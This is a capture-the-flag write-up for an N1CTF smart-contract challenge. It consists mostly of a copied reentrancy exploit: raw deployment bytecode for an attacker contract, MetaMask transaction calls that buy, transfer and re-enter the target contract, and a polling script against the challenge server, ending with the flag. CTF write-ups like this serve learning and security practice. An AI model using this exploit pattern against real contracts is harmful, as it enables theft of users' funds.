# h4ck Smart Contract 4 Fun

- I figured out that this is a SIMPLE reentrancy bug, So I was waiting for the exploit that someone wrote. After few hours later, I copied and used someone's exploit.

# create contract

```javascript
transactionParameters = {
  nonce: '0x00', // ignored by MetaMask
  gasPrice: '', // customizable by user during MetaMask confirmation.
  gasLimit: '',  // customizable by user during MetaMask confirmation.
  from: web3.eth.accounts[0], // must match user's active address.
  value: '0x00', // Only required to send ether to the recipient from the initiating external account.
  data: '0x608060405234801561001057600080fd5b5073e2d6d8808087d2e30eadf0acb67708148dbee0c06000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610506806100746000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806321df0da7146101265780638e7ea5b2146101305780639e5faafc1461013a575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260646040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b1580156100e857600080fd5b505af11580156100fc573d6000803e3d6000fd5b505050506040513d602081101561011257600080fd5b810190808051906020019092919050505050005b61012e610151565b005b610138610348565b005b34801561014657600080fd5b5061014f61040b565b005b60008090505b6064811015610345576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016020604051808303818588803b1580156101e657600080fd5b505af11580156101fa573d6000803e3d6000fd5b50505050506040513d602081101561021157600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb73' + '7bf87920309e018b5c775f9dd11127a66e972890' + '60016040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156102fc57600080fd5b505af1158015610310573d6000803e3d6000fd5b505050506040513d602081101561032657600080fd5b8101908080519060200190929190505050508080600101915050610157565b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663656f82696040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b1580156103cd57600080fd5b505af11580156103e1573d6000803e3d6000fd5b505050506040513d60208110156103f757600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260646040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15801561049c57600080fd5b505af11580156104b0573d6000803e3d6000fd5b505050506040513d60208110156104c657600080fd5b8101908080519060200190929190505050505600a165627a7a723058207cff5a5f8b48160a8f09538bb4bebf4e171d1d2a6e1473a2584e646db3bbe1b80029', // Optional, but used for defining smart contract creation and interaction.
  chainId: 3 // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
}

ethereum.sendAsync({
  method: 'eth_sendTransaction',
  params: [transactionParameters],
  from: ethereum.selectedAddress,
}, function() { console.log(arguments) })
```


# buy & transfer

transactionParameters = {
  nonce: '0x00', // ignored by MetaMask
  gasPrice: '', // customizable by user during MetaMask confirmation.
  gasLimit: '',  // customizable by user during MetaMask confirmation.
  from: web3.eth.accounts[0], // must match user's active address.
  to: '0xa09c515f4d5b7cddd47683974423012d4a1bbbc2',
  value: '100000', // Only required to send ether to the recipient from the initiating external account.
  data: '0x21df0da7', // Optional, but used for defining smart contract creation and interaction.
  chainId: 3 // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
}

ethereum.sendAsync({
  method: 'eth_sendTransaction',
  params: [transactionParameters],
  from: ethereum.selectedAddress,
}, function() { console.log(arguments) })



# reentrancy & set winners

```javascript
transactionParameters = {
  nonce: '0x00', // ignored by MetaMask
  gasPrice: '', // customizable by user during MetaMask confirmation.
  gasLimit: '66666',  // customizable by user during MetaMask confirmation.
  from: web3.eth.accounts[0], // must match user's active address.
  to: '0x7bf87920309e018b5c775f9dd11127a66e972890',
  value: '0', // Only required to send ether to the recipient from the initiating external account.
  data: '0x9e5faafc', // Optional, but used for defining smart contract creation and interaction.
  chainId: 3 // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
}

ethereum.sendAsync({
  method: 'eth_sendTransaction',
  params: [transactionParameters],
  from: ethereum.selectedAddress,
}, function() { console.log(arguments) })



transactionParameters = {
  nonce: '0x00', // ignored by MetaMask
  gasPrice: '', // customizable by user during MetaMask confirmation.
  gasLimit: '66666',  // customizable by user during MetaMask confirmation.
  from: web3.eth.accounts[0], // must match user's active address.
  to: '0x7bf87920309e018b5c775f9dd11127a66e972890',
  value: '0', // Only required to send ether to the recipient from the initiating external account.
  data: '0x8e7ea5b2', // Optional, but used for defining smart contract creation and interaction.
  chainId: 3 // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
}

ethereum.sendAsync({
  method: 'eth_sendTransaction',
  params: [transactionParameters],
  from: ethereum.selectedAddress,
}, function() { console.log(arguments) })

```

- I wrote simple crawl script since there is an race issue on getting a flag.

```python
from requests import get

for i in range(1000):
	c = get('http://47.244.41.61/challenge?address=0x7bf87920309e018b5c775f9dd11127a66e972890')
	print(c.text)
```


- flag: N1CTF{cfc94d6c8a73db4a088e69510dfa415144236cd9}
